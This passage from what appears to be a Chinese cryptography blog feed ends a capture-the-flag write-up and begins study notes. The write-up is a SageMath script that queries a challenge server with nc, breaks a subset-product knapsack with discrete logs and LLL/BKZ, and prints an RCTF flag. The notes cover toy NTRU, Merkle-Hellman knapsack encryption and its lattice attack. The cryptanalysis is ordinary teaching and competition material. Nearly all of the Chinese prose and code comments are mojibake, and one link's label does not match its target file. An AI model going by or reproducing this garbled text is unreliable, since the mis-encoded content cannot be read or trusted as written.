¹ï¼Œç„¶åå¯¹æ‰€æœ‰çš„æ•°æ®åˆ©ç”¨pohligç®—æ³•è§£ä¸€ä¸ªç¦»æ•£å¯¹æ•°ï¼Œå°±æ˜¯å¼€ä¸€ä¸ªlogï¼Œè¿™æ ·è¿™ä¸ªå­é›†ç§¯çš„é—®é¢˜å°±èƒ½é‡æ–°å˜å›å­é›†å’Œçš„é—®é¢˜äº†ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from sage.all import *</span><br><span class="line">import ast, sys, subprocess</span><br><span class="line">import hashlib</span><br><span class="line">from <span class="built_in">random</span> import shuffle</span><br><span class="line">from <span class="built_in">time</span> import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">#ä¸æ–­ncä»¥è·å–ä¸€ä¸ªå…·æœ‰p-<span class="number">1</span> smoothæ€§è´¨çš„æ¨¡æ•°p</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    data = subprocess.check_output(<span class="string">"nc 124.156.133.6 22298 &lt;/dev/null"</span>, shell=True).splitlines()</span><br><span class="line">    p = int(data[<span class="number">0</span>])</span><br><span class="line">    nums = ast.literal_eval(data[<span class="number">1</span>].decode())</span><br><span class="line">    r = int(data[<span class="number">2</span>])</span><br><span class="line">    encflag = int(data[<span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    fp1 = <span class="built_in">factor</span>(p-<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"p-1 ="</span>, fp1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> all(d &lt; <span class="number">2</span>**<span class="number">50</span> <span class="keyword">for</span> d, e <span class="keyword">in</span> fp1):#åˆ¤æ–­æ¨¡æ•°æ˜¯å¦å…·æœ‰p-<span class="number">1</span> smoothçš„æ€§è´¨</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"too high factor of p-1"</span>)</span><br><span class="line"></span><br><span class="line"># è§£ç¦»æ•£å¯¹æ•°é—®é¢˜ -&gt; å°†å­é›†ç§¯é—®é¢˜è½¬åŒ–é—®å­é›†å’Œ</span><br><span class="line">F = GF(p)</span><br><span class="line">g = F.primitive_element() #è·å–åŸæ ¹g</span><br><span class="line">es = []</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">num</span> <span class="keyword">in</span> nums:</span><br><span class="line">    e = F(<span class="built_in">num</span>).<span class="built_in">log</span>(g)#ä»¥åŸæ ¹ä¸ºåº•æ•°å¼€<span class="built_in">log</span>ï¼Œå› ä¸ºå¾ªç¯ç¾¤ä¸­æ‰€æœ‰çš„æ•°éƒ½èƒ½ä»¥åŸæ ¹è¡¨ç¤º</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">num</span>, <span class="string">"-&gt;"</span>, e)</span><br><span class="line">    es.<span class="built_in">append</span>(e)</span><br><span class="line"></span><br><span class="line">r = F(r).<span class="built_in">log</span>(g)</span><br><span class="line">nums = es</span><br><span class="line"><span class="built_in">mod</span> = p - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#åˆ©ç”¨LLLè§£å†³<span class="number">0</span>-<span class="number">1</span>èƒŒåŒ…é—®é¢˜</span><br><span class="line">N = <span class="number">90</span></span><br><span class="line"></span><br><span class="line">nums0 = nums[::]</span><br><span class="line"></span><br><span class="line">BS = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">itr</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="built_in">itr</span> += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">itr</span>, <span class="string">"BS"</span>, BS)</span><br><span class="line">    t0 = <span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">    nums = nums0[::]</span><br><span class="line">    shuffle(nums)</span><br><span class="line"></span><br><span class="line">    h = QQ(<span class="number">1</span>)/<span class="number">2</span></span><br><span class="line">    #  n1 <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    #  n2 <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    #  n3 <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    #  n4 <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line">    #   r h h h h h</span><br><span class="line">    # <span class="built_in">mod</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line">    m = <span class="built_in">matrix</span>(QQ, N+<span class="number">2</span>, N+<span class="number">2</span>)</span><br><span class="line">    m.set_column(<span class="number">0</span>, nums + [r, <span class="built_in">mod</span>])</span><br><span class="line">    m.set_row(N, [r] + [h] * (N+<span class="number">1</span>))</span><br><span class="line">    m[:N,<span class="number">1</span>:N+<span class="number">1</span>] = identity_matrix(N)</span><br><span class="line"></span><br><span class="line">    m.set_column(<span class="number">0</span>, <span class="number">50</span>*m.column(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    ml = (m*<span class="number">2</span>).change_ring(ZZ).BKZ(block_size=BS)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"time %.3fs"</span> <span class="symbol">%</span> (<span class="built_in">time</span>() - t0))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> irow, <span class="built_in">row</span> <span class="keyword">in</span> enumerate(ml):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (-<span class="number">1</span> &lt;= <span class="built_in">min</span>(<span class="built_in">row</span>[:-<span class="number">1</span>]) &lt; <span class="built_in">max</span>(<span class="built_in">row</span>[:-<span class="number">1</span>]) &lt;= <span class="number">1</span>):</span><br><span class="line">            continue</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">row</span>[-<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">row</span> = -<span class="built_in">row</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"GOOD"</span>, irow)</span><br><span class="line">        secret = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">row</span>[<span class="number">1</span>+i] &lt; <span class="number">0</span>:</span><br><span class="line">                secret |= <span class="number">1</span> &lt;&lt; nums0.index(nums[i])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"secret"</span>, secret, <span class="string">"="</span>, hex(secret))</span><br><span class="line">        </span><br><span class="line">        h = hashlib.sha256(str(secret).encode('utf-<span class="number">8</span>')).digest()</span><br><span class="line">        h = int.from_bytes(h, <span class="string">"big"</span>)</span><br><span class="line">        flag = encflag ^ h</span><br><span class="line">        <span class="built_in">print</span>(int(flag).to_bytes(<span class="number">100</span>, <span class="string">"big"</span>).strip(b<span class="string">"\x00"</span>))</span><br><span class="line">        <span class="built_in">quit</span>()</span><br><span class="line"></span><br><span class="line"># RCTF&#123;M4th_0f_MuLLLtiplication_2333&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Knapsack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Knapsack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ introduction to mathematical cryptography</title>
      <link href="/2020/05/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bintroduction%20to%20mathematical%20cryptography/"/>
      <url>/2020/05/27/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bintroduction%20to%20mathematical%20cryptography/</url>
      
        <content type="html"><![CDATA[<p>æ¥ï¼Œç”¨ <a href="https://github.com/JayxV/Van1sh_Utility/blob/main/paper%26book/Twenty%20Years%20of%20Attacks%20on%20the%20RSA%20Cryptosystem.pdf" target="_blank" rel="noopener">introduction to mathematical cryptography</a> å…¥ä¸ªé—¨~</p><h2 id="Lattices-and-Cryptographyï¼ˆUpdatingï¼‰"><a href="#Lattices-and-Cryptographyï¼ˆUpdatingï¼‰" class="headerlink" title="Lattices and Cryptographyï¼ˆUpdatingï¼‰"></a>Lattices and Cryptographyï¼ˆUpdatingï¼‰</h2><h3 id="A-congruential-public-key-cryptosystem"><a href="#A-congruential-public-key-cryptosystem" class="headerlink" title="A congruential public key cryptosystem"></a>A congruential public key cryptosystem</h3><p>é¦–å…ˆæ¥ä»‹ç»ä¸€ä¸ªä½ç»´åº¦çš„NTRUã€‚è¿™é‡ŒåŒä½ é«˜ä¸­çš„æœ‹å‹æåä¸€æ ·ï¼Œæˆ‘ä»¬è¿™é‡Œçš„æœ‹å‹ä»ç„¶æ˜¯Aliceå’ŒBob</p><h4 id="preparation"><a href="#preparation" class="headerlink" title="preparation"></a>preparation</h4><p>Aliceé¦–å…ˆé€‰ä¸€ä¸ªè¦å…¬å¼€çš„å¤§ç´ æ•°$q$ï¼Œç„¶åå†é€‰æ‹©ä»–è‡ªå·±çš„ç§é’¥å¯¹$(f,g)$ï¼Œå…¶ä¸­ï¼Œ$f&lt; \sqrt{\frac{q}{2}},\sqrt{\frac{q}{4}}&lt;g&lt;\sqrt{\frac{q}{2}} $ å¹¶ä¸”ï¼Œ$gcd(f,g) = 1$ï¼Œç„¶åAliceè®¡ç®—å¥¹çš„å…¬é’¥ $h \equiv f^{-1}g \pmod q$ã€‚</p><h4 id="encryption"><a href="#encryption" class="headerlink" title="encryption"></a>encryption</h4><p>Aliceå‡†å¤‡æ¥å—åŠ å¯†ä¿¡æ¯äº†ï¼Œäºæ˜¯å¥¹é¦–å…ˆå°†$h$ä¼ ç»™Bobï¼Œç„¶åBobå‡†å¤‡åŠ å¯†æ¶ˆæ¯mï¼Œä»–é¦–å…ˆéšæœºé€‰æ‹©ä¸€ä¸ªä¸´æ—¶å¯†é’¥$r$ï¼Œç„¶åéœ€è¦æ»¡è¶³$0&lt;m&lt; \sqrt{\frac{q}{4}},0&lt;r&lt;\sqrt{\frac{q}{2}} $ã€‚ç„¶åä»–è®¡ç®—å¯†æ–‡$e \equiv rh+m \pmod q$</p><h4 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h4><p>Aliceè¦è§£å¯†æ¶ˆæ¯äº†ï¼Œå¥¹é¦–å…ˆè®¡ç®—ä¸€ä¸ª$a \equiv fe \pmod q $ï¼Œç„¶åè®¡ç®—$b \equiv f^{-1}a \pmod g$ã€‚</p><h4 id="proof"><a href="#proof" class="headerlink" title="proof"></a>proof</h4><p>è¿™é‡Œè¯æ˜ä¸€æ³¢è¿™ä¸ªè§£å¯†çš„æ­£ç¡®æ€§ï¼š</p><p>é¦–å…ˆ $a \equiv fe \equiv f(rh+m)\equiv frf^{-1}g+fm\equiv rg + fm \pmod q$</p><p>ç„¶åè¿™é‡Œæˆ‘ä»¬çœ‹ä¸€ä¸‹$r,g,f,m$çš„å¤§å°</p><p>ç”±äº$rg+fm&lt;\sqrt{\frac{q}{2}}\sqrt{\frac{q}{2}}+\sqrt{\frac{q}{2}}\sqrt{\frac{q}{4}}&lt;q$</p><p>æ‰€ä»¥è¿™é‡Œè¿™ä¸ªåŒä½™ç¬¦å·å¯ä»¥æ‰”æ‰äº†ï¼Œå³$a = rg+fm$</p><p>ç„¶å$b \equiv f^{-1}a \equiv f^{-1}(rg + fm)\equiv f^{-1}fm \equiv m \pmod g$</p><p>å› ä¸ºä¹‹å‰è¯´å¥½çš„ $m &lt; \sqrt{\frac{q}{4}}&lt;g$ ï¼Œ æ‰€ä»¥è¿™ä¸ª$b=m$ã€‚</p><h4 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h4><p>æ¥ä¸ªæ€»ä½“æµç¨‹</p><p><img src="https://i.loli.net/2020/05/25/1oMjYBS5rOiyKbz.png" alt></p><h4 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h4><p>æ–°ä¼™ä¼´æ¥äº†ï¼ŒEveï¼Œæ˜¯ä¸ªhacker</p><p>ä»–å°†å¦‚ä½•ç ´è§£è¿™ä¸ªä½ç»´åº¦çš„NTRUå‘¢ï¼Ÿ</p><p>è§£å¯†çš„å…³é”®æ˜¯è·å¾—ç§é’¥å¯¹$(f,g)$ï¼Œè€Œä»–ç›®å‰èƒ½è·å¾—çš„æ˜¯$(q,h)$</p><p>å› ä¸º$h \equiv f^{-1}g \pmod q$</p><p>æ‰€ä»¥æœ‰$fh = g + rq$ ï¼Œræ˜¯æŸä¸ªæ•´æ•°</p><p>è¿™é‡Œæ¥ä¸€ä¸ªå¼å­ $F(1,h) - R(0,q) = (F,G)$ï¼Œå…¶ä¸­$Fh = G+Rq$</p><p>å› æ­¤ï¼ŒEveæœ‰ä¸¤ä¸ªå‘é‡$v_1=(1,h),v_2=(0,q)$,ä»–ç°åœ¨åªéœ€è¦æ‰¾åˆ°ä¸¤ä¸ªæ•´ç³»æ•°$F,R$ ä½¿å¾—$L = {Fv_1+Rv_2}$æ˜¯ä¸€ä¸ªæ¯”è¾ƒçŸ­çš„å‘é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªå‘é‡å°±ç›¸å½“äºAliceçš„ç§é’¥å¯¹äº†ã€‚</p><p>ä¸ºå•¥å˜ï¼ŸEveæ‰‹é‡Œçš„ä¸¤ä¸ªå·²çŸ¥å‘é‡çš„æ¨¡é•¿çš„ä½é•¿(bit length)éƒ½æ˜¯è·Ÿ $q$ ä¸€ä¸ªçº§åˆ«çš„ï¼Œè€Œ$F,G$éƒ½å°äº$\sqrt{\frac{q}{2}}$ï¼Œæ‰€ä»¥$(F,G)$åœ¨è¿™ä¸ªå‘é‡ç©ºé—´é‡Œæ¥è¯´æ˜¯ç›¸å¯¹æ¯”è¾ƒçŸ­çš„å‘é‡äº†ã€‚</p><p>é‚£ä¹ˆæœ‰ä»€ä¹ˆæ–¹æ³•èƒ½å¤Ÿå¿«é€Ÿåœ°è·å¾—è¿™ä¸ªçŸ­å‘é‡å‘¢ï¼Ÿ</p><p>æ…¢æ…¢æ¥ï¼Œä¸æ€¥~</p><h3 id="Subset-sum-problems-and-knapsack-cryptosystems"><a href="#Subset-sum-problems-and-knapsack-cryptosystems" class="headerlink" title="Subset-sum problems and knapsack cryptosystems"></a>Subset-sum problems and knapsack cryptosystems</h3><p>å¯†ç å­¦ä¸­çš„åˆ©ç”¨knapsack problemçš„åŠ å¯†ã€‚å¤§æ„å°±æ˜¯ï¼Œä½ å…¬å¼€ä¸€ä¸ªåºåˆ—ï¼Œç„¶åä½ æŠŠä½ çš„æ¶ˆæ¯è½¬ä¸ºäºŒè¿›åˆ¶ï¼Œå¦‚æœä½ æ¶ˆæ¯çš„è¿™ä¸€ä½æ˜¯1ï¼Œå°±ä»ä½ åºåˆ—ä¸­å–å¤„å¯¹åº”ä½ç½®çš„å€¼ï¼Œæœ€åå¯†æ–‡å°±æ˜¯ä½ æ‰€æœ‰å–å‡ºçš„å€¼çš„å’Œã€‚</p><p>ä½†æ˜¯è¿™æ ·å°±äº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼ŒåŠ å¯†æ˜¯åŠ è¿‡å»äº†ã€‚é‚£è¯¥æ€ä¹ˆè§£å¯†å‘¢ï¼Ÿ</p><p>è›®åŠ›æ”»å‡»çš„æ—¶é—´å¤æ‚åº¦æ˜¯$Oï¼ˆ2^nï¼‰$,å°±ç®—ä¸­é€”ç›¸é‡ä¹Ÿåªèƒ½é™ä½åˆ°$O(2^{\frac{n}{2}})$ã€‚å¤ªéš¾äº†ã€‚ã€‚ã€‚</p><p>é‚£Aliceæ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿå…¬é’¥å¯†ç ç³»ç»Ÿå¦‚ä½•ä½“ç°å‘¢ï¼Ÿåˆ«æ€¥ï¼Œæ¥äº†ã€‚</p><p>Aliceç°åœ¨çš„åºåˆ—ä¸ä¸€èˆ¬äº†ï¼Œå¥¹è¿™æ¬¡ç”¨çš„æ˜¯è¶…é€’å¢åºåˆ—ã€‚ä»€ä¹ˆæ˜¯è¶…é€’å¢åºåˆ—å‘¢ï¼Ÿå°±æ˜¯åä¸€é¡¹æ˜¯å‰ä¸€é¡¹çš„ä¸¤å€+ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œåä¸€é¡¹å¤§äºå‰é¢çš„æ‰€æœ‰é¡¹ä¹‹å’Œã€‚</p><p>æœ‰è¶…é€’å¢åºåˆ—åï¼Œç»™ä½ ä¸€ä¸ªå¯†æ–‡ï¼Œä½ åªéœ€è¦ä¸€é¡¹ä¸€é¡¹å¯¹æ¯”è¿‡æ¥ï¼Œä½ å°±èƒ½çŸ¥é“åŠ å¯†è€…é€‰å–çš„å…ƒç´ æ˜¯å“ªå‡ ä¸ªäº†ã€‚</p><p>è¿™ä¸éš¾ç†è§£ã€‚æˆ‘ä»¬å°†åºåˆ—ä¸­çš„æ¯ä¸€é¡¹æ”¾åˆ°äºŒè¿›åˆ¶ä¸‹å°±å¾ˆæ˜æ˜¾ã€‚å¦‚æœç¬¬ä¸€é¡¹çš„ä½é•¿æ˜¯2ï¼Œé‚£ç¬¬äºŒé¡¹çš„ä½é•¿å°±è‡³å°‘æ˜¯3ï¼Œç¬¬ä¸‰é¡¹çš„ä½é•¿è‡³å°‘æ˜¯4ã€‚å¦‚æœä½ çš„å¯†æ–‡æœ€åæ˜¯ä¸ª2ä½é•¿çš„ï¼Œé‚£åŠ å¯†è€…å¿…æ²¡æœ‰ç”¨åˆ°ç¬¬ä¸‰é¡¹ï¼Œå¿…ç”¨åˆ°äº†ç¬¬äºŒé¡¹ã€‚ã€å½“ç„¶ï¼Œè¿™åœ¨æ¯ä¸€é¡¹åªèƒ½ç”¨ä¸€æ¬¡çš„å¤§å‰æä¸‹ã€‘</p><h4 id="preparation-1"><a href="#preparation-1" class="headerlink" title="preparation"></a>preparation</h4><p>Aliceå‡†å¤‡åŠ å¯†äº†ï¼Œé¦–å…ˆå¥¹å…ˆæ•´äº†ä¸€ä¸ªè¶…é€’å¢åºåˆ—ï¼Œ$r = (r_1,r_2,,,r_n)$ï¼Œç„¶åå¥¹æ•´äº†ä¸¤ä¸ªå¤§æ•°Aå’ŒBï¼Œå…¶ä¸­è¦æ±‚$B&gt;2r_n$ ä¹Ÿå°±æ˜¯Bå¤§äºè¿™ä¸ªè¶…é€’å¢åºåˆ—ä¹‹å’Œå•¦ã€‚ç„¶åè¦éœ€è¦$gcd(A,B)=1$ï¼Œå› ä¸ºä¹‹åè¦æ±‚ä¸€ä¸ªAåœ¨Bä¸‹çš„é€†ã€‚</p><h4 id="encryption-1"><a href="#encryption-1" class="headerlink" title="encryption"></a>encryption</h4><p>Aliceè¦åŠ å¯†äº†ï¼Œå¥¹å…ˆç”¨å¥¹çš„Aå’Œå¥¹çš„è¶…é€’å¢åºåˆ—ç”Ÿæˆä¸€ä¸ªæ–°çš„åºåˆ—Mï¼Œå…¶ä¸­$M_i \equiv Ar_i \pmod B$</p><p>è¿™ä¸ªæ–°çš„åºåˆ—å°±æ˜¯Aliceçš„å…¬é’¥äº†ï¼Œå¥¹æŠŠè¿™ä¸ªåºåˆ—ç”©ç»™Bobï¼Œç„¶åBobæŒ‰ç…§ä¹‹å‰æè¿°çš„æ–¹å¼ï¼Œç”¨è¿™ä¸ªåºåˆ—å’Œä»–çš„æ˜æ–‡ç”Ÿæˆå¯†æ–‡$S = x*M = \sum_ \limits {i=1}^{n}x_iM_i$ï¼Œç„¶åæŠŠè¿™ä¼ ç»™Alice</p><h4 id="decryption-1"><a href="#decryption-1" class="headerlink" title="decryption"></a>decryption</h4><p>Aliceè¦è§£å¯†äº†ï¼Œå¥¹æ•´åˆ°äº†è¿™ä¸ªå¯†æ–‡Sï¼Œç„¶åè®¡ç®—ä¸€æ³¢$Sâ€™ \equiv A^{-1}S \equiv A^{-1}\sum_\limits {i=1}^{n}x_iM_i\equiv A^{-1}\sum_\limits{i=1}^{n}x_iAr_i\equiv \sum_\limits{i=1}^{n}x_ir_i \pmod B$</p><p>æ‰€ä»¥è¿™ä¸ª$Sâ€™$å°±æ˜¯å¯†æ–‡åœ¨è¶…é€’å¢åºåˆ—ä¸‹çš„å€¼äº†ï¼Œä¹‹åå†åƒä¹‹å‰é‚£æ ·åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ª$Sâ€™$å’Œåºåˆ—é‡Œé¢æ¯ä¸€é¡¹çš„å…³ç³»å°±èƒ½è§£å‡ºæ˜æ–‡äº†ã€‚ã€è®°å¾—ä»åºåˆ—å¤§çš„ä¸€ç«¯å¼€å§‹åˆ¤æ–­ï¼Œå¦‚æœæ»¡è¶³å…³ç³»åˆ«å¿˜äº†å‡æ‰é‚£ä¸€é¡¹å†åˆ¤æ–­ä¸‹ä¸€é¡¹ã€‘</p><p>ä¼ªä»£ç èµ°ä¸€æ³¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reverse(r):</span><br><span class="line"><span class="keyword">if</span> s &gt;= i:</span><br><span class="line">        m = <span class="string">'1'</span> + m</span><br><span class="line">        s -= i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = <span class="string">'0'</span> + m</span><br></pre></td></tr></table></figure><h4 id="table"><a href="#table" class="headerlink" title="table"></a>table</h4><p>æ¥ä¸ªæ€»ä½“æµç¨‹</p><p><img src="https://i.loli.net/2020/05/26/7HwAdyNEGqDKLat.png" alt></p><h4 id="attention"><a href="#attention" class="headerlink" title="attention"></a>attention</h4><p>è¿™é‡Œå‡ºäºå®‰å…¨æ€§è€ƒè™‘ï¼Œè¦è®©$r_1 &gt; 2^n$ï¼Œé‚£$r_n &gt; 2r_{n-1}&gt;2^nr_1&gt;2^{2n}$,è‡³äºä¸ºå•¥è¦æ±‚$r_1$å¤§äºè¿™ä¸ªæ•°ï¼Œä¿ºè¿˜æš‚æ—¶æ²¡å»æ·±ç©¶ã€‚</p><p>å¦‚æœç°åœ¨å‡è®¾è¿™ä¸ªn=160ï¼Œé‚£ä¹ˆè¿™æ•´ä¸ªå…¬é’¥çš„é•¿åº¦å°±å¤§çº¦æœ‰$2n^2 = 51200$ bitsäº†ã€‚çœŸé¡¶ã€‚ä½†æ˜¯è¿™ä¸ªå¯†ç ç³»ç»ŸåŠ å¯†çš„æ—¶å€™æ²¡ç”¨åˆ°æ¨¡è¿ç®—ï¼Œè§£å¯†çš„æ—¶å€™ä¹Ÿå°±ç”¨äº†ä¸€æ¬¡æ¨¡ä¹˜ï¼Œè¿™æ–¹é¢åœ¨ç¡¬ä»¶å®ç°ä¸Šä¼¼ä¹æ¯”RSAï¼ŒDiffie-Hellmanæ•ˆç‡äº›ã€‚</p><h4 id="further-more"><a href="#further-more" class="headerlink" title="further more"></a>further more</h4><p>ä¹‹å‰æåˆ°Aliceæœ€å¼€å§‹æ•´çš„ä¸€ä¸ªæ— åºçš„åºåˆ—ï¼Œç”±äºè¿™ç©æ„å„¿æ²¡æœ‰é™·é—¨(trapdoor)ï¼Œå› æ­¤è¿™æ— æ³•æˆä¸ºä¸€ä¸ªå¯†ç ç³»ç»Ÿã€‚ä½†è‡ªä»æœ‰å…³LLLè¿™ä¸ªå¯†ç å­¦å¤§æ€å™¨çš„paperå‘è¡¨åï¼ŒåŸºäºèƒŒåŒ…çš„å¯†ç ç³»ç»Ÿå‡ºç°äº†ä¸€ä¸ªå¤§weaknessï¼Œè¿™ä½¿å¾—nç°åœ¨è¦å¤§äº300äº†ï¼Œé‚£ä¹ˆç§é’¥çš„é•¿åº¦è¦è¾¾åˆ°æƒŠäººçš„180000bitsï¼Œçº¦ç­‰äº176KBï¼Œè¿™åœ¨å®é™…è¿ç”¨ä¸­æœ‰ç‚¹å¤ªéš¾é¡¶äº†ã€‚</p><p>è¿™é‡Œç®€çŸ­çš„ä»‹ç»ä¸‹Eveæ€ä¹ˆå»è§£å†³è¿™ä¸ªæ— åºåºåˆ—çš„èƒŒåŒ…é—®é¢˜ã€‚</p><h5 id="first-step"><a href="#first-step" class="headerlink" title="first-step"></a>first-step</h5><p>Eveå…ˆæ•´äº†ä¸€ä¸ªçŸ©é˜µ$M =<br>\begin{bmatrix}<br>2&amp;0&amp;0&amp;\dots&amp;0&amp;0&amp;m_1 \newline<br>0&amp;2&amp;0&amp;\dots&amp;0&amp;0&amp;m_2 \newline<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots \newline<br>0&amp;0&amp;0&amp;\dots&amp;2&amp;0&amp;m_{n-1}\newline<br>0&amp;0&amp;0&amp;\dots&amp;0&amp;2&amp;m_{n}\newline<br>1&amp;1&amp;1&amp;\dots&amp;1&amp;1&amp;S\newline<br>\end{bmatrix}$</p><p>å…¶ä¸­è¿™ä¸ª$m_1,m_2,m_3â€¦$å°±æ˜¯é‚£ä¸ªåºåˆ—ï¼ŒSå°±æ˜¯å¯†æ–‡</p><p>ç„¶åEveä»è¿™ä¸ªçŸ©é˜µä¸­ï¼ŒæŠŠæ¯ä¸€æ¡è¡Œå‘é‡ç»™æ•´äº†å‡ºæ¥ï¼Œåˆ†åˆ«ä¸º$V_1,V_2,â€¦,V_n,V_{n+1}$</p><p>æˆ‘ä»¬ç°åœ¨å‡è®¾å‘é‡$x = (x_1,x_2,x_3,â€¦,x_n)$ æ˜¯æ˜æ–‡ï¼Œ($x_i = 0$ or $1$)</p><p>é‚£ä¹ˆè¿™ä¸ªæ ¼ä¸­å°±ä¼šæœ‰è¿™ä¹ˆä¸€æ¡å‘é‡    </p><p>$t = \sum \limits _ {i=1}^{n} x _ i V _ i - V _ {n+1} = (2x_1 - 1,2x_2 - 1,â€¦,2x_n - 1,0)$</p><p>æˆ‘ä»¬ä¹‹å‰çš„$V_1,V_2$è¿™äº›å‘é‡çš„æ¨¡é•¿ï¼Œå› ä¸º$m_i,S$çš„åŸå› ï¼Œå¤§æ¦‚éƒ½æœ‰ä¸ª$2^n$å§ï¼Œè€Œè¿™ä¸ªtï¼Œå› ä¸º$2x_i-1=\pm 1$ï¼Œæ‰€ä»¥tçš„æ¨¡é•¿æ˜¯$\sqrt{n}$ï¼Œ</p><p>æ‰€ä»¥ï¼Œå¦‚æœEveçŸ¥é“å¦‚ä½•æ‰¾åˆ°latticeä¸­çš„çŸ­å‘é‡ï¼Œé‚£ä¹ˆä»–å°±å¯ä»¥ç ´è§£è¿™ç©æ„å•¦ã€‚</p><p>å…³äºæ‰¾åˆ°latticeä¸­çŸ­å‘é‡çš„ç®—æ³•æˆ‘ä»¬ç§°ä¹‹ä¸ºreduction algorithmï¼Œæœ€è‘—åçš„å°±æ˜¯LLL algorithmäº†ï¼Œç„¶åå®ƒè¿˜æœ‰å˜ä½“LLL-BKZã€‚è¿™äº›ä¸œè¥¿ï¼Œä»¥åå†ä»‹ç»å•¦ã€‚ä¸‹é¢æˆ‘ä»¬å›åˆ°èµ·ç‚¹ï¼Œæ¥è®²è®²è¿™ä»¤äººè¿·é†‰çš„lattice</p><h3 id="A-brief-review-of-vector-spaces"><a href="#A-brief-review-of-vector-spaces" class="headerlink" title="A brief review of vector spaces"></a>A brief review of vector spaces</h3><h4 id="Vector-Spaces"><a href="#Vector-Spaces" class="headerlink" title="Vector 